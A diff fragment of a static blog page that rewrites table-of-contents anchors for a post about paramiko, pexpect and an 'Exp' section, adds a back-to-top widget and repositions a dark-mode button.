-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#难点"><span class="nav-number">1.</span> <span class="nav-text">难点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#模块选择"><span class="nav-number">1.1.</span> <span class="nav-text">1. 模块选择</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#paramiko"><span class="nav-number">1.1.1.</span> <span class="nav-text">(1) paramiko</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pexpect"><span class="nav-number">1.1.2.</span> <span class="nav-text">(2) pexpect</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">2. Exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码"><span class="nav-number">2.</span> <span class="nav-text">代码</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#难点"><span class="nav-number">1.</span> <span class="nav-text">难点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-模块选择"><span class="nav-number">1.1.</span> <span class="nav-text">1. 模块选择</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-paramiko"><span class="nav-number">1.1.1.</span> <span class="nav-text">(1) paramiko</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-pexpect"><span class="nav-number">1.1.2.</span> <span class="nav-text">(2) pexpect</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Exp"><span class="nav-number">1.2.</span> <span class="nav-text">2. Exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码"><span class="nav-number">2.</span> <span class="nav-text">代码</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -524,6 +520,10 @@
   </div>
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -677,8 +677,8 @@
 <script>
 var options = {
   bottom: '64px', // default: '32px'
-  right: 'unset', // default: '32px'
-  left: '32px', // default: 'unset'
+  right: '32px', // default: '32px'
+  left: 'unset', // default: 'unset'
   time: '0.5s', // default: '0.3s'
   mixColor: '#fff', // default: '#fff'
   backgroundColor: '#fff',  // default: '#fff'
